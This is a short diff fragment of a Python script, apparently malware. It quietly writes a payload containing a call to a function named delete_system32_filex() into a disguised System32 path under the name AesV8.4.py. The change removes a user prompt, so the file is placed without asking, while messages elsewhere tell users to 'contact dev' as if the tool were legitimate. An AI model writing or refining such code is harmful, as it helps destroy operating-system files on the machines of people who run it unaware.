@@ -27,14 +27,10 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
-
-
+os.system('cls')
+create_batch_file(file_contentpathx, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
 if location:
     os.system('cls')
-    print("Location of your python.")
-    print("If you don't know where is the path, contact dev.")
-    mylocationofpy = input("Enter the path of your python:")
-    create_batch_file(mylocationofpy, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
 else:
     print(f"An incorrect version of python is detected. Contact Dev.")
     input()
